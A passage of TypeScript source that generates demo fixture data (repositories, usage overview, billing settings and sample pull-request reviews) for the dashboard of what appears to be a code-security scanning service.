      orgLogin: DEMO_LOGIN,
      orgAdmin: true,
      billing: { planId: "standard", credits: 120, checkedAt: ago(5) },
      loc: repo.loc,
      lastDeepScanAt: repo.lastDeep === null ? null : ago(repo.lastDeep),
      open: openBySeverity(repo.name),
      lastScan: live ? { id: DEMO_LIVE_SCAN_ID, kind: "deep", status: "running", at: ago(1) } : last ? { id: last.id, kind: last.kind, status: last.status, at: last.createdAt } : null,
      reviews30d: repo.reviews,
      activeDeepScanId: live ? DEMO_LIVE_SCAN_ID : null,
      activeDeepScanWaitsForRecon: false,
      freeDig: false,
      defaultBranch: "main",
      prReviews: repo.privateRepo ? "auto" : "command",
      deepScanSchedule: live ? "weekly" : "off",
      nextDeepScanAt: live ? new Date(Date.now() + 3 * 86_400_000) : null,
    };
  });
}

export function demoRepo(id: string): DashboardRepo | undefined {
  return demoRepos().find((repo) => repo.id === id);
}

/** Thirty days of an account in steady use. */
export function demoOverview(days = 30): Overview {
  const today = Date.now();
  const open = none();
  for (const f of FINDINGS) if (f.status === "open") open[f.severity]++;
  return {
    now: { pullRequests: 64, reviews: 71, deepScans: 3, found: 12, fixed: 7, credits: 96 },
    before: { pullRequests: 52, reviews: 58, deepScans: 2, found: 9, fixed: 5, credits: 80 },
    open,
    days: Array.from({ length: days }, (_, i) => ({
      day: new Date(today - (days - 1 - i) * 86_400_000).toISOString().slice(0, 10),
      reviews: [1, 3, 2, 4, 0, 2, 3][i % 7]! + (i > 20 ? 1 : 0),
      deep: i === 18 || i === 21 || i === 26 ? 1 : 0,
      found: i % 4 === 1 ? 1 : 0,
      fixed: i % 5 === 2 ? 1 : 0,
    })),
  };
}

export function demoRecord(): HackerRecord {
  return {
    jobs: { deep: 3, reviews: 128, other: 9 },
    lines: 412_000,
    found: 14,
    fixed: 9,
    open: FINDINGS.filter((f) => f.status === "open").length,
    since: ago(40 * DAY),
    active: { id: DEMO_LIVE_SCAN_ID, kind: "deep", status: "running", repoFullName: `${DEMO_LOGIN}/api` },
  };
}

/** The account on the plan, with its repositories, as Settings reads it. */
export function demoSettings(): { orgs: SettingsOrg[]; billing: OrgBillingRow; team: OrgTeam } {
  const billing: OrgBillingRow = {
    orgId: DEMO_ORG_ID,
    planId: "standard",
    pastDue: false,
    endsAt: null,
    renewsAt: ago(-20 * DAY),
    nextPlanId: null,
    credits: 120,
    creditsResetAt: ago(-20 * DAY),
    autoTopUp: null,
    activatedAt: ago(40 * DAY),
    checkedAt: ago(5),
    creditLevel: 0,
    creditLevelAt: null,
    creditLevelRev: 0,
  };
  const org: SettingsOrg = {
    id: DEMO_ORG_ID,
    login: DEMO_LOGIN,
    type: "Organization",
    installationId: 1,
    settings: { checkThreshold: "high", emailNotifications: true },
    admin: true,
    billing,
    repos: REPOS.map((repo) => ({ id: id(repo.n), fullName: `${DEMO_LOGIN}/${repo.name}`, private: repo.privateRepo })),
  };
  return { orgs: [org], billing, team: sampleSettings().team };
}

/**
 * The sample open pull requests, on a demo repo: each review links to one of the repo's own demo PR reviews
 * (a PR without one is shown as not yet reviewed), so every link in the demo opens a page.
 */
export function demoPulls(repoId: string): PullRow[] {
  const reviews = demoScans({ repoId, kind: "pr_review" });
  return samplePulls().map((pull, i) => {
    const scan = reviews[i];
    return { ...pull, review: pull.review && scan ? { ...pull.review, scanId: scan.id } : null };
  });
}
